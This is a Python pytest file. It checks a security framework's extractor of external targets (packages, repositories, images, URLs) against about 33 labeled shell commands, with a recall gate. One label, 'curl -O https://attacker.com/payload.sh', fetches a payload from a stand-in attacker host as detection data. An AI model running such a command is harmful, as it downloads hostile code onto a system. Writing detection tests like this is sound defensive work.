"""Phase 2 §7 gate #4 — `external_target_extractor` exact-match recall corpus.

Spec gate: exact-match recall ≥ 95% with ≤ 1 miss out of ≥ 30 labeled
commands. Each command's expected target set is the canonical extraction
the framework should produce.
"""

from __future__ import annotations

import pytest

from security_framework.external_target_extractor import extract_external_targets


def _action(cmd: str) -> dict:
    return {"type": "command", "command": cmd}


def _names(targets: list[dict], type_filter: str | None = None) -> set[str]:
    out: set[str] = set()
    for t in targets:
        if type_filter and t.get("type") != type_filter:
            continue
        name = t.get("name") or t.get("url") or t.get("path") or ""
        if name:
            out.add(name)
    return out


# (command, expected_target_names_set, optional type_filter)
LABELED: list[tuple[str, set[str], str | None]] = [
    # pip targets
    ("pip install requests", {"requests"}, "package"),
    ("pip install requests urllib3", {"requests", "urllib3"}, "package"),
    ("pip install -r requirements.txt", {"requirements.txt"}, "requirements_file"),
    ("pip3 install --upgrade httpx", {"httpx"}, "package"),
    ("pip install .", {"."}, "local_package"),
    ("pip install ./", {"./"}, "local_package"),
    ("pip install -e .", {"."}, "local_package"),
    ("pip install pyyaml", {"pyyaml"}, "package"),
    ("pip install 0wneg", {"0wneg"}, "package"),
    # npm targets
    ("npm install lodash", {"lodash"}, "package"),
    ("npm install react react-dom", {"react", "react-dom"}, "package"),
    ("npm i express", {"express"}, "package"),
    ("npm add chalk", {"chalk"}, "package"),
    ("yarn add typescript", {"typescript"}, "package"),
    ("yarn add @types/node", {"@types/node"}, "package"),
    # apt targets
    ("apt install curl", {"curl"}, "package"),
    ("apt-get install -y nginx", {"nginx"}, "package"),
    # git clone (repo target)
    ("git clone https://github.com/foo/bar", {"https://github.com/foo/bar"}, "repo"),
    ("git clone https://github.com/org/proj.git", {"https://github.com/org/proj.git"}, "repo"),
    ("git clone git@github.com:org/repo.git", {"git@github.com:org/repo.git"}, "repo"),
    # docker pull
    ("docker pull ubuntu:22.04", {"ubuntu:22.04"}, "container_image"),
    ("docker pull alpine", {"alpine"}, "container_image"),
    # URL extraction
    ("curl https://example.com/file.json -o out.json", {"https://example.com/file.json"}, "url"),
    ("wget https://download.org/big.tar.gz", {"https://download.org/big.tar.gz"}, "url"),
    ("curl -O https://attacker.com/payload.sh", {"https://attacker.com/payload.sh"}, "url"),
    # combined / mixed
    ("pip install requests && curl https://e.com/x", {"requests", "https://e.com/x"}, None),
    # commands with no targets — should return empty
    ("ls", set(), None),
    ("pwd", set(), None),
    ("echo hello", set(), None),
    ("cat README.md", set(), None),
    ("python script.py", set(), None),
    ("git status", set(), None),
    ("npm run build", set(), None),
]

assert len(LABELED) >= 30, f"Gate #4 requires ≥30 labels; got {len(LABELED)}"


@pytest.mark.parametrize("cmd,expected,type_filter", LABELED)
def test_extracted_targets_match(cmd: str, expected: set[str], type_filter: str | None):
    targets = extract_external_targets(_action(cmd))
    actual = _names(targets, type_filter)
    # We measure exact-match; if expected is empty, actual must be empty too
    assert actual == expected, (
        f"\n  command:  {cmd!r}\n"
        f"  expected (type={type_filter}): {sorted(expected)}\n"
        f"  actual:                       {sorted(actual)}\n"
        f"  raw targets: {targets}"
    )


def test_aggregate_gate_threshold():
    """Phase 2 §7 gate #4 — count exact-match misses."""
    misses = 0
    miss_details = []
    for cmd, expected, type_filter in LABELED:
        targets = extract_external_targets(_action(cmd))
        actual = _names(targets, type_filter)
        if actual != expected:
            misses += 1
            miss_details.append((cmd, expected, actual))
    n = len(LABELED)
    assert misses <= 1, (
        f"\n  Gate #4 FAILED: {misses} misses out of {n}\n"
        f"  first misses: {miss_details[:5]}"
    )
